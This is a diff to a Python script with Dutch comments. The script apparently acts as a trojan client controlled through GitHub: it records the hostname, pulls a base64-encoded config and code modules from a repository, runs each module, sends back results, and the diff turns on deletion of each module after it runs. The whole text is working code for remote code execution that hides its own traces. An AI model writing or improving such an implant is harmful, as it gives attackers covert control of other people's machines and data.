@@ -5,6 +5,7 @@ import time
 import importlib.util
 import requests
 import socket
+import base64
 
 # haal hostname op
 hostname = socket.gethostname()
@@ -29,11 +30,18 @@ def fetch_config():
     # Download configuratiebestand van de GitHub-repo
     url = f"{GITHUB_REPO}/contents/config/config.json"
     response = requests.get(url, headers=HEADERS)
-    if response.status_code == 200:
-        content = json.loads(response.json()["content"])
-        return json.loads(content)
-    else:
-        print(f"Fout bij ophalen van configuratie: {response.status_code}")
+    try:
+        if response.status_code == 200:
+            # Haal Base64-gecodeerde inhoud op en decodeer het
+            content = response.json()["content"]
+            decoded_content = base64.b64decode(content).decode("utf-8")
+            config = json.loads(decoded_content)  # Laad de gedecodeerde inhoud als JSON
+            return config
+        else:
+            print(f"Fout bij ophalen van configuratie: {response.status_code}")
+            return {}
+    except Exception as e:
+        print(f"Fout bij verwerken van configuratie: {e}")
         return {}
 
 def fetch_module(module_name):
@@ -55,7 +63,7 @@ def execute_module(module_path):
     module = importlib.util.module_from_spec(spec)
     spec.loader.exec_module(module)
     result = module.run()  # Veronderstelt dat elke module een `run()`-functie heeft
-    #os.remove(module_path)  # Verwijder de tijdelijke module na uitvoering
+    os.remove(module_path)  # Verwijder de temp module na uitvoering
     return result
 
 def send_results(data):
